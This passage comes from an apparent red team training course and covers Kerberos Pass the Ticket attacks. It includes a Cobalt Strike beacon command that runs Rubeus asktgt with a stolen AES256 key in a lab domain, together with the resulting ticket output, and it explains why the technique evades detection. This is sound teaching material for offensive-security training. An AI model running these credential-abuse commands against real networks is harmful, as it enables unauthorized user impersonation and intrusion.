
_Pass the Ticket_ (or PtT), is a technique [T1550.003](https://attack.mitre.org/techniques/T1550/003/) that allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation.  As with PtH, this can be implemented in different ways.  Tools like Impacket implement the Kerberos protocol for remote authentication, and tools like Rubeus inject tickets into the credential cache of a given logon session.

PtT is superior to PtH in a few important aspects.  Kerberos authentication is not anomalous, nor is it restricted as with NTLM; and passing tickets into a logon session can be done with native Windows APIs, so it does not rely on patching LSASS memory.  This makes it more stealthy, and isn't prevented by PPL.

### Requesting TGTs

We already saw in the [Credential Access](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67851a86ba9789af1107f5f9) section how Kerberos tickets can be extracted from memory.  But the adversary can also legitimately request Kerberos tickets on behalf of a user if they have their NTLM hash or AES encryption keys.  Using an NTLM hash will return RC4-encrypted tickets, which is generally not advisable.

Rubeus' `asktgt` command can be used with a user's AES key.  This will return a ticket in base64 encoded format.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\rsteel'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFo[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  17/02/2025 13:18:21
  EndTime                  :  17/02/2025 23:18:21
  RenewTill                :  24/02/2025 13:18:21
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  7ImgleIR6fnHZCxJW7MJUCabAjxvIsMS7Z55VRPaEHU=
  ASREP (key)              :  05579261E29FB01F23B007A89596353E605AE307AFCD1AD3234FA12F94EA696
```